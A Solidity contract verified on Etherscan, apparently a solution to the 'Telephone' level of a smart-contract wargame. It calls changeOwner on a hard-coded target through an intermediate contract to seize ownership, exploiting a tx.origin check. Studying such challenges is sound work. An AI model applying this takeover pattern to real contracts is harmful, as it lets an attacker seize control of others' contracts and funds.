/**
 *Submitted for verification at Etherscan.io on 2022-05-04
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.13;

interface TelephoneInter{
    function changeOwner(address _owner) external;
}

contract Level4 {

    constructor() public {}

    function changeOwner() public{
        TelephoneInter(0x09D99975fCb4162AD8711cDf1293aB4Fb17842B9).changeOwner(0x2651423752f2590AB0bb9B1857bFc983adb4c806);
    }

}